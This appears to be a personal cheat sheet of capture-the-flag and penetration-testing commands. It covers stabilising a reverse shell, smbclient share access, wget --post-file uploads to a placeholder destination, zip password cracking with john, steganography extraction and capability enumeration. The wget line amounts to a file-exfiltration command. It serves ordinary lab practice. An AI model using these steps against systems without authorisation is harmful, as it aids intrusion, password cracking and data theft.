1)) If you get a reverse shell you know what that's look like without meterpreter or something. If you want to get a stable,interactive bash shell and if python is supported, then

> python -c "import pty; pty.spawn('/bin/bash')"

2)) Sometimes i get confused with smbclient. So this note is for mine.

> smbclient -L $IP$or$domain$

> smbclient \\\\\\\\$IP$or$domain$\\\\share

For downloading a file from remote server,

> get file

For uploading a file to remote server,

> put file

3)) When sending a POST request using the ' --post-file ' option, Wget treats the file as a binary file and will send every character in the POST request without stripping trailing newline or formfeed characters. Any other control characters in the text will also be sent as-is in the POST request.

> wget --post-file=file_to_post $desIP$:$PORT$

4)) scp (secure copy) command in Linux system is used to copy file(s) between servers in a secure way. The SCP command or secure copy allows secure transferring of files in between the local host and the remote host or between two remote hosts.

> scp <user@ip>:file-location destination

5)) If you have a password protected zip file,then you can use our useful friend john.

> zip2john file.zip > file.hash

> john file.hash

6)) Suppose you have a image file. As you are a hacker, you know what's that.You can extract a file or message from that image file.You can use binwalk for 
extracting file and steghide or zsteg for message.

> binwalk file.png

> binwalk -e file.png

7)) I don't know why linux system doesn't actually take golang as their own.Every time i have to write the following command to poke the system.

> source ~/.profile

8)) To see if capabilities are set on files in linux system, 

> getcap -r / 2>/dev/null

9)) Sometime ssh command doesn't work. Below command might help,

> sudo ip link set dev tun0 mtu 1200

Changing the mtu can help, increasing it can improve performance, decreasing can help with packet loss.

10)) After getting a reverse shell,

> python3 -c 'import pty;pty.spawn("/bin/bash")'

> press ctrl+z, to background the process

> stty raw -echo;fg

> export TERM = xterm

